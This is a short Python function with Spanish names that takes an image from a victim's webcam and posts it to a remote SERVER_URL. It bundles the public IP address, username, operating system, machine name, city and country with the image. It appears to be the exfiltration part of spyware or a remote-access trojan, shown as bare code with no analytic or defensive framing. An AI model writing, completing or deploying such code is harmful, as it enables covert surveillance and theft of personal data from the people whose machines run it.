def enviar_al_servidor(info, archivos):
    try:
        with open(archivos["webcam"], "rb") as wc:
            files = {
                "image": wc
            }
            data = {
                "ip": info["ip_publica"],
                "username": info["usuario"],
                "system_info": f'{info["sistema"]} {info["version"]} - {info["nombre_equipo"]} - {info.get("ciudad", "")}, {info.get("pais", "")}'
            }
            response = requests.post(SERVER_URL, files=files, data=data)
            print("[+] Enviado al servidor:", response.status_code)
    except Exception as e:
        print(f"[!] Error enviando datos: {e}")
